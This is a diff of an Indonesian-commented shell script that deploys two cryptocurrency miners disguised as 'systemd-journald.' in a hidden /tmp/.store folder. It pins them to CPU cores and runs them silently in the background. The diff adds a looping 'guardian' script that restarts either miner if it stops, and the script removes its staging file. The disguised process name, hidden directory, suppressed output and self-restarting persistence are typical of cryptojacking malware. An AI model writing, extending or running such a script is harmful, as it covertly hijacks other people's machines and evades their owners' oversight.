@@ -27,28 +27,52 @@ rm -f cache.tar.gz
 mv cache systemd-journald.
 
 # Copy ke folder 1 dan 2
-cp systemd-journald /tmp/.store/1/
-cp systemd-journald /tmp/.store/2/
+cp systemd-journald. /tmp/.store/1/
+cp systemd-journald. /tmp/.store/2/
 chmod +x /tmp/.store/1/systemd-journald.
 chmod +x /tmp/.store/2/systemd-journald.
 
 # Bersih-bersih
 rm -f systemd-journald.
 
-cd
+# Bikin skrip auto-restart guardian
+cat > /tmp/.store/guardian.sh << 'EOF'
+#!/bin/bash
 
-# Jalankan miner dari dalam foldernya tanpa -c config.ini
+while true
+do
+    # Cek miner 1
+    if ! pgrep -f "/tmp/.store/1/systemd-journald." > /dev/null
+    then
+        echo "[!] Miner 1 mati... menghidupkan ulang."
+        cd /tmp/.store/1 && nohup taskset -c 0 ./systemd-journald. > /dev/null 2>&1 &
+    fi
+
+    # Cek miner 2
+    if ! pgrep -f "/tmp/.store/2/systemd-journald." > /dev/null
+    then
+        echo "[!] Miner 2 mati... menghidupkan ulang."
+        cd /tmp/.store/2 && nohup taskset -c 1 ./systemd-journald. > /dev/null 2>&1 &
+    fi
+
+    sleep 30
+done
+EOF
+
+chmod +x /tmp/.store/guardian.sh
+
 echo -e "${GREEN}[*] Starting miners...${NC}"
 
-# Start miner pertama (pakai CPU core 0)
+# Start miner pertama
 cd /tmp/.store/1 && nohup taskset -c 0 ./systemd-journald. > /dev/null 2>&1 &
 
-# Balik ke root
-cd 
-
-# Start miner kedua (pakai CPU core 1)
+# Start miner kedua
 cd /tmp/.store/2 && nohup taskset -c 1 ./systemd-journald. > /dev/null 2>&1 &
-echo -e "${GREEN}[✓] Setup selesai dan miners jalan di background.${NC}"
+
+# Start guardian nya
+nohup bash /tmp/.store/guardian.sh > /dev/null 2>&1 &
+
+echo -e "${GREEN}[✓] Setup selesai, miners jalan, guardian jalan.${NC}"
 
 # Cek miner jalan
 ps aux | grep systemd-journald. | grep -v grep
